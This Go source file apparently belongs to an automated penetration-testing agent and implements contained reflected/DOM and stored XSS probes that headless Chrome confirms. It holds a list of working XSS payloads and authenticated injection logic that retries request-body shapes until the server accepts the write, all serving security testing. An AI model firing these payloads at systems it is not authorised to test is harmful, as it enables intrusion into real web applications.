package probes

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync/atomic"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/fetch"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"

	"github.com/t0ul/GORED/internal/core"
	"github.com/t0ul/GORED/internal/tools"
)

// DOM/reflected XSS that actually EXECUTES is the class dalfox (xss_scan) under-reports and a static
// reflection check cannot see: a payload that only runs once the browser builds the DOM, or is
// written into a client-side sink. This probe drives a real headless Chrome, injects a payload that
// writes a unique nonce to window.__gored, and reads it back — so the browser's own execution is the
// oracle (a reflected-but-escaped value never fires, so there is no false positive). It is generic
// (payloads carry no app-specific values; the probe only ever gets the target URL + a param to fuzz)
// and contained (navigation is egress-gated and every browser request is intercepted so only the
// target host is reachable; an off-target beacon is failed and counted).

// domxssPayloads are generic execution payloads; %[1]s is the nonce. They cover the common reflection
// contexts (HTML text, broken-out attribute, raw script, and a JS-string break-out).
var domxssPayloads = []string{
	`"><img src=x onerror="window.__gored='%[1]s'">`,
	`'><img src=x onerror="window.__gored='%[1]s'">`,
	`<img src=x onerror="window.__gored='%[1]s'">`,
	`<svg onload="window.__gored='%[1]s'">`,
	`<script>window.__gored='%[1]s'</script>`,
	`';window.__gored='%[1]s';//`,
}

// DOMXSSFinding is a browser-confirmed XSS; Payload is empty when nothing executed.
type DOMXSSFinding struct {
	URL        string
	Payload    string
	CWE        string // CWE-79
	Confidence core.Confidence
	Evidence   string
	Denied     int // off-target browser requests blocked during the probe (containment proof)
}

// Flagged reports whether a payload executed in the browser.
func (f DOMXSSFinding) Flagged() bool { return f.Payload != "" }

// DOMXSSProbe tests a URL for XSS that executes in a real browser.
type DOMXSSProbe struct {
	Base    string
	Egress  *core.Egress
	Param   string // query param to inject when the template has no FUZZ marker (default "q")
	Timeout time.Duration
}

// chromePath returns a host Chrome/Chromium binary, or "" to let chromedp auto-detect.
func chromePath() string {
	for _, p := range []string{
		"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
		"/Applications/Chromium.app/Contents/MacOS/Chromium",
		"/usr/bin/google-chrome",
		"/usr/bin/chromium",
	} {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return ""
}

// browserSession launches a contained headless browser for the target and returns its context, the
// off-target-request counter, and a cleanup func. Containment: every browser request is intercepted
// and only the target host (plus about:/data:/blob: internals) is allowed; an off-target request — a
// payload beaconing out — is failed and counted, the browser-level analog of the egress allowlist.
// Shared by the reflected (Probe) and stored (ProbeStored) probes.
func browserSession(ctx context.Context, base string, to time.Duration) (context.Context, *int64, func(), error) {
	if to == 0 {
		to = 30 * time.Second
	}
	baseCtx, cancelT := context.WithTimeout(ctx, to)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.NoSandbox,
		chromedp.DisableGPU,
		chromedp.Flag("disable-background-networking", true),
		chromedp.Flag("no-first-run", true),
		chromedp.Flag("no-default-browser-check", true),
	)
	if cp := chromePath(); cp != "" {
		opts = append(opts, chromedp.ExecPath(cp))
	}
	allocCtx, cancelA := chromedp.NewExecAllocator(baseCtx, opts...)
	// Silence chromedp's async event logger: a current Chrome emits a newer Network IPAddressSpace
	// enum (e.g. "Loopback") than this cdproto knows, so it logs an unmarshal error for every
	// request event. That noise is cosmetic — the oracle is the window.__gored read-back, and real
	// failures still surface through chromedp.Run — so drop it rather than spam the campaign log.
	bctx, cancelB := chromedp.NewContext(allocCtx, chromedp.WithErrorf(func(string, ...interface{}) {}))
	cleanup := func() { cancelB(); cancelA(); cancelT() }

	allowHost := hostOf(base)
	denied := new(int64)
	chromedp.ListenTarget(bctx, func(ev interface{}) {
		e, ok := ev.(*fetch.EventRequestPaused)
		if !ok {
			return
		}
		go func() {
			c := chromedp.FromContext(bctx)
			ectx := cdp.WithExecutor(bctx, c.Target)
			if reqAllowed(e.Request.URL, allowHost) {
				_ = fetch.ContinueRequest(e.RequestID).Do(ectx)
				return
			}
			atomic.AddInt64(denied, 1)
			_ = fetch.FailRequest(e.RequestID, network.ErrorReasonBlockedByClient).Do(ectx)
		}()
	})
	if err := chromedp.Run(bctx, fetch.Enable()); err != nil {
		cleanup()
		return nil, nil, func() {}, err
	}
	return bctx, denied, cleanup, nil
}

// Probe navigates a headless browser to the target with each payload and returns the first that
// executes. tmpl is a URL containing the literal marker FUZZ where the payload goes.
func (p *DOMXSSProbe) Probe(ctx context.Context, tmpl string) (DOMXSSFinding, error) {
	bctx, denied, cleanup, err := browserSession(ctx, p.Base, p.Timeout)
	if err != nil {
		return DOMXSSFinding{}, fmt.Errorf("dom_xss: start browser: %w", err)
	}
	defer cleanup()

	for _, pl := range domxssPayloads {
		nonce := "gored" + nonceHex()
		inj := url.QueryEscape(fmt.Sprintf(pl, nonce))
		u := strings.ReplaceAll(tmpl, "FUZZ", inj)
		if p.Egress == nil || !p.Egress.Allowed(u) {
			continue // navigation is egress-gated to the target
		}
		var got string
		// Each navigation is a fresh document, so window.__gored is undefined unless THIS payload
		// executed and set it to the nonce.
		err := chromedp.Run(bctx,
			chromedp.Navigate(u),
			chromedp.Sleep(250*time.Millisecond),
			chromedp.Evaluate(`window.__gored || ""`, &got),
		)
		if err != nil {
			continue
		}
		if got == nonce {
			return DOMXSSFinding{
				URL: u, Payload: fmt.Sprintf(pl, nonce), CWE: "CWE-79", Confidence: core.ConfCertain,
				Evidence: fmt.Sprintf("payload executed in a real browser (nonce %s written to window.__gored) at %s", nonce, u),
				Denied:   int(atomic.LoadInt64(denied)),
			}, nil
		}
	}
	return DOMXSSFinding{Denied: int(atomic.LoadInt64(denied))}, nil
}

// nonceHex returns a short random hex token used to prove a payload executed (the browser writes it
// to window.__gored and the probe reads it back), so a stale or reflected value cannot be mistaken
// for execution.
func nonceHex() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		panic("gored: crypto/rand unavailable: " + err.Error())
	}
	return hex.EncodeToString(b)
}

// hostOf returns the host[:port] of a base URL for the containment allow-check.
func hostOf(base string) string {
	if u, err := url.Parse(base); err == nil {
		return u.Host
	}
	return ""
}

// reqAllowed permits a browser request only to the target host or to a browser-internal scheme.
func reqAllowed(raw, allowHost string) bool {
	u, err := url.Parse(raw)
	if err != nil {
		return false
	}
	switch u.Scheme {
	case "about", "data", "blob", "chrome", "devtools":
		return true
	}
	return u.Host == allowHost
}

// DOMXSSTool (dom_xss) exposes the probe to the agent loop. The sentinel is emitted only when the
// browser actually executed the payload, read by ExploitDetector — the model cannot assert a capture.
type DOMXSSTool struct {
	Gate *tools.Gate
	Base string
}

func (DOMXSSTool) Name() string { return "dom_xss" }
func (DOMXSSTool) Describe() string {
	return `Test a URL for cross-site scripting that EXECUTES in a real headless browser (DOM/reflected, CWE-79). ` +
		`args: {"url":"http://host/search?q=FUZZ"} (put the marker FUZZ where a parameter's value goes) ` +
		`or {"path":"/search","param":"q"}. It injects payloads and confirms a finding only when one runs in the browser.`
}

func (t DOMXSSTool) Call(ctx context.Context, args map[string]any) (string, error) {
	tmpl, err := domxssTemplate(args, t.Base)
	if err != nil {
		return "", fmt.Errorf("dom_xss: %w", err)
	}
	p := &DOMXSSProbe{Base: t.Base, Egress: t.Gate.Egress(), Param: tools.AsString(args["param"])}
	f, err := p.Probe(ctx, tmpl)
	if err != nil {
		return "", err
	}
	if f.Flagged() {
		return DOMXSSSentinel + " " + f.Evidence, nil
	}
	return "no dom xss: injected payloads did not execute in the browser", nil
}

// domxssTemplate resolves the args into a URL containing the FUZZ marker. If the caller already put
// FUZZ in the url it is used as-is; otherwise the chosen param's value is set to FUZZ.
func domxssTemplate(args map[string]any, base string) (string, error) {
	raw := tools.AsString(args["url"])
	if raw == "" {
		path := tools.AsString(args["path"])
		if path == "" {
			return "", fmt.Errorf("need a url or path")
		}
		if !strings.HasPrefix(path, "/") {
			path = "/" + path
		}
		raw = strings.TrimRight(base, "/") + path
	}
	if strings.Contains(raw, "FUZZ") {
		return raw, nil
	}
	param := tools.AsString(args["param"])
	if param == "" {
		param = "q"
	}
	sep := "?"
	if strings.Contains(raw, "?") {
		sep = "&"
	}
	return raw + sep + param + "=FUZZ", nil
}

// storedBodyMarker is where the payload goes in a raw body template, so the model can express any
// write shape (a JSON array, nested objects, specific required fields) and still have the probe
// drop the nonce payload in — the self-correction path when a flat {field:...} body is rejected.
const storedBodyMarker = "__PAYLOAD__"

// InjectSpec describes the write that plants a stored payload. The simple form is a Field (plus any
// Other fields) encoded as JSON (or Form). BodyTemplate is the escape hatch: a raw request body
// containing storedBodyMarker where the payload goes, so the caller can match an endpoint that wants
// an array or specific fields (RR's /api/ingest wants a JSON array of {Source,AssetIdentifier,Title}).
type InjectSpec struct {
	Method, Path, Field string
	Other               map[string]string
	Form                bool
	BodyTemplate        string // raw body with storedBodyMarker; overrides Field/Other when set
	ContentType         string // for BodyTemplate; defaults to application/json
}

// StoredXSSProbe confirms STORED XSS: it plants a nonce execution payload through a write endpoint
// (as the authenticated identity), then loads each render page in a real browser (carrying the same
// session) and reports the first payload that executes there. Injected at A, executed at B — the
// browser's own execution is the oracle, exactly like the reflected probe, so a stored-but-escaped
// value never fires (no false positive). Nothing app-specific is compiled in: the caller supplies
// the write endpoint, the field and the render pages from the recon map.
type StoredXSSProbe struct {
	Base     string
	Egress   *core.Egress
	Sessions *core.Sessions
	Session  string // identity whose cookie jar authorizes the plant and the render
	Timeout  time.Duration
}

// ProbeStored plants each payload through inject, then checks whether it executes on any render
// page. The second return value is an actionable diagnostic used when nothing executed — so the
// agent can SELF-CORRECT: it names whether the plant itself was rejected (and the status/snippet)
// versus planted-but-not-rendered, instead of a dead-end "no xss".
func (p *StoredXSSProbe) ProbeStored(ctx context.Context, inject InjectSpec, renderPaths []string) (DOMXSSFinding, string, error) {
	if inject.BodyTemplate != "" && !strings.Contains(inject.BodyTemplate, storedBodyMarker) {
		return DOMXSSFinding{}, "", fmt.Errorf("stored_xss: body template must contain %s where the payload goes", storedBodyMarker)
	}
	if len(renderPaths) == 0 {
		return DOMXSSFinding{}, "", fmt.Errorf("stored_xss: need at least one render page")
	}
	bctx, denied, cleanup, err := browserSession(ctx, p.Base, p.Timeout)
	if err != nil {
		return DOMXSSFinding{}, "", fmt.Errorf("stored_xss: start browser: %w", err)
	}
	defer cleanup()

	// Carry the authenticated session into the browser so render pages behind login load as the
	// signed-in identity (RR-H1's render pages are the approver/Sheriff pages).
	if p.Sessions != nil && p.Session != "" {
		if u, e := url.Parse(p.Base); e == nil {
			if cookies := p.Sessions.Client(p.Session).Jar.Cookies(u); len(cookies) > 0 {
				host := u.Hostname()
				if err := chromedp.Run(bctx, chromedp.ActionFunc(func(cx context.Context) error {
					exp := cdp.TimeSinceEpoch(time.Now().Add(24 * time.Hour))
					for _, c := range cookies {
						if e := network.SetCookie(c.Name, c.Value).WithDomain(host).WithPath("/").WithExpires(&exp).Do(cx); e != nil {
							return e
						}
					}
					return nil
				})); err != nil {
					return DOMXSSFinding{}, "", fmt.Errorf("stored_xss: set session cookie: %w", err)
				}
			}
		}
	}

	planted := 0           // plants the server accepted (2xx)
	var lastReject string  // the most recent rejection, surfaced so the model can fix the body
	for _, pl := range domxssPayloads {
		nonce := "gored" + nonceHex()
		payload := fmt.Sprintf(pl, nonce)
		status, snippet, err := p.plant(ctx, inject, payload)
		if err != nil {
			lastReject = "plant error: " + err.Error()
			continue
		}
		if status >= 400 {
			lastReject = fmt.Sprintf("HTTP %d: %s", status, snippet)
			continue // the write was rejected, so there is nothing stored to render — fix the body
		}
		planted++
		for _, rp := range renderPaths {
			ru := strings.TrimRight(p.Base, "/") + ensureLeadingSlash(rp)
			if p.Egress == nil || !p.Egress.Allowed(ru) {
				continue
			}
			var got string
			err := chromedp.Run(bctx,
				chromedp.Navigate(ru),
				chromedp.Sleep(300*time.Millisecond),
				chromedp.Evaluate(`window.__gored || ""`, &got),
			)
			if err != nil {
				continue
			}
			if got == nonce {
				return DOMXSSFinding{
					URL: ru, Payload: payload, CWE: "CWE-79", Confidence: core.ConfCertain,
					Evidence: fmt.Sprintf("stored payload planted via %s %s executed in a real browser (nonce %s) when %s rendered it", strings.ToUpper(def(inject.Method, "POST")), inject.Path, nonce, ru),
					Denied:   int(atomic.LoadInt64(denied)),
				}, "", nil
			}
		}
	}
	// Nothing executed: say WHY so the agent can self-correct rather than give up.
	var diag string
	if planted == 0 {
		diag = fmt.Sprintf("no stored xss: the write %s %s was REJECTED every time (object/array/form shapes all tried), so nothing was stored. Read the response, add the fields it requires, and retry with a body template, e.g. {\"body\":\"[{\\\"<field>\\\":\\\"__PAYLOAD__\\\"}]\"} (put __PAYLOAD__ where the value goes; use the real field names the endpoint wants). Last response: %s",
			strings.ToUpper(def(inject.Method, "POST")), inject.Path, def(lastReject, "(none)"))
	} else {
		diag = fmt.Sprintf("no stored xss: the write %s %s was accepted (%d payloads stored) but none executed on the render pages %v — the payload may land in a field these pages do not display; try other render pages or put the payload in the field the page shows",
			strings.ToUpper(def(inject.Method, "POST")), inject.Path, planted, renderPaths)
	}
	return DOMXSSFinding{Denied: int(atomic.LoadInt64(denied))}, diag, nil
}

type reqBody struct{ body, ctype string }

// plantBodies returns the candidate request bodies to try for one payload. When the caller gave an
// explicit BodyTemplate it is honored as-is (the caller chose the shape). Otherwise the tool adapts
// the SHAPE generically — a JSON object, then the same wrapped in an ARRAY (the common "expected
// array" endpoint), then form-encoded — so a plain shape mismatch self-heals. It never invents field
// NAMES (that would be overfitting to one app); the caller still supplies the fields.
func plantBodies(inject InjectSpec, payload string) []reqBody {
	if inject.BodyTemplate != "" {
		return []reqBody{{strings.ReplaceAll(inject.BodyTemplate, storedBodyMarker, payload), def(inject.ContentType, "application/json")}}
	}
	m := map[string]string{}
	if inject.Field != "" {
		m[inject.Field] = payload
	}
	for k, v := range inject.Other {
		m[k] = v
	}
	obj, _ := json.Marshal(m)
	arr, _ := json.Marshal([]map[string]string{m})
	vals := url.Values{}
	for k, v := range m {
		vals.Set(k, v)
	}
	form := reqBody{vals.Encode(), "application/x-www-form-urlencoded"}
	if inject.Form {
		return []reqBody{form, {string(obj), "application/json"}, {string(arr), "application/json"}}
	}
	return []reqBody{{string(obj), "application/json"}, {string(arr), "application/json"}, form}
}

// plant sends the write that stores the payload, as the authenticated identity, egress-gated. It
// tries the candidate body shapes in order and stops at the first the server accepts (2xx); it
// returns that status and a short response snippet (so a rejection is actionable), erroring only on
// egress/transport failure — an HTTP 4xx is data the caller reports, not an error.
func (p *StoredXSSProbe) plant(ctx context.Context, inject InjectSpec, payload string) (int, string, error) {
	raw := strings.TrimRight(p.Base, "/") + ensureLeadingSlash(inject.Path)
	if p.Egress == nil || !p.Egress.Allowed(raw) {
		return 0, "", fmt.Errorf("egress denied: %s", raw)
	}
	method := strings.ToUpper(def(inject.Method, http.MethodPost))
	var status int
	var snippet string
	for _, b := range plantBodies(inject, payload) {
		req, err := http.NewRequestWithContext(ctx, method, raw, strings.NewReader(b.body))
		if err != nil {
			return 0, "", err
		}
		req.Header.Set("Content-Type", b.ctype)
		resp, err := p.Sessions.Client(p.Session).Do(req) // authed jar
		if err != nil {
			return 0, "", err
		}
		snip, _ := io.ReadAll(io.LimitReader(resp.Body, 200))
		resp.Body.Close()
		status, snippet = resp.StatusCode, strings.TrimSpace(string(snip))
		if status < 400 {
			return status, snippet, nil // this shape was accepted; stop adapting
		}
	}
	return status, snippet, nil // every shape rejected; report the last response
}

func ensureLeadingSlash(p string) string {
	if !strings.HasPrefix(p, "/") {
		return "/" + p
	}
	return p
}

func def(s, fallback string) string {
	if s == "" {
		return fallback
	}
	return s
}

// StoredXSSTool (stored_xss) plants a payload through a write endpoint and confirms it executes when
// a render page displays it — stored XSS, the vibecoder's classic "user input rendered unescaped".
// The browser's execution is the oracle; the model supplies the endpoints from the mapped surface.
type StoredXSSTool struct {
	Gate     *tools.Gate
	Base     string
	Sessions *core.Sessions // authed jar shared with recon/login
	Session  string         // identity to plant + view as (default "priv")
}

func (StoredXSSTool) Name() string { return "stored_xss" }
func (StoredXSSTool) Describe() string {
	return `Confirm STORED cross-site scripting (CWE-79): plant a payload through a write endpoint, then check it EXECUTES in a real browser when a page renders it. ` +
		`Simple form: {"method":"POST","path":"/api/ingest","field":"title","other":{"severity":"High"},"render":["/dashboard","/admin"]} — the payload goes in "field", "other" carries any required fields. ` +
		`If the endpoint rejects that shape (e.g. HTTP 400), READ the error and switch to a body template: {"method":"POST","path":"/api/ingest","body":"[{\"Source\":\"s\",\"AssetIdentifier\":\"__PAYLOAD__\",\"Title\":\"t\"}]","content_type":"application/json","render":["/admin"]} — put __PAYLOAD__ where the payload belongs (an array, nested fields, the exact field the page shows). ` +
		`Loads each "render" page in a headless browser; confirms only when the payload runs there. On a miss it tells you whether the write was rejected (fix the body) or stored-but-not-rendered (try other render pages / the displayed field).`
}

func (t StoredXSSTool) Call(ctx context.Context, args map[string]any) (string, error) {
	inject := InjectSpec{
		Method:       tools.AsString(args["method"]),
		Path:         tools.AsString(args["path"]),
		Field:        tools.AsString(args["field"]),
		Form:         asBool(args["form"]),
		Other:        asStringMap(args["other"]),
		BodyTemplate: tools.AsString(args["body"]),
		ContentType:  tools.AsString(args["content_type"]),
	}
	if inject.Path == "" {
		return "", fmt.Errorf("stored_xss: need a write 'path'")
	}
	render := asStringSlice(args["render"])
	if len(render) == 0 {
		return "", fmt.Errorf("stored_xss: need 'render' pages (where the planted data is displayed)")
	}
	session := tools.AsString(args["session"])
	if session == "" {
		session = t.Session
	}
	if session == "" {
		session = "priv"
	}
	p := &StoredXSSProbe{Base: t.Base, Egress: t.Gate.Egress(), Sessions: t.Sessions, Session: session}
	f, diag, err := p.ProbeStored(ctx, inject, render)
	if err != nil {
		return "", err
	}
	if f.Flagged() {
		return DOMXSSSentinel + " " + f.Evidence, nil
	}
	return diag, nil // actionable: says whether to fix the body or try other render pages
}

func asBool(v any) bool { b, _ := v.(bool); return b }

func asStringSlice(v any) []string {
	switch x := v.(type) {
	case []string:
		return x
	case []any:
		var out []string
		for _, e := range x {
			if s := tools.AsString(e); s != "" {
				out = append(out, s)
			}
		}
		return out
	case string:
		if x != "" {
			return []string{x}
		}
	}
	return nil
}

func asStringMap(v any) map[string]string {
	m, ok := v.(map[string]any)
	if !ok {
		return nil
	}
	out := make(map[string]string, len(m))
	for k, e := range m {
		out[k] = tools.AsString(e)
	}
	return out
}
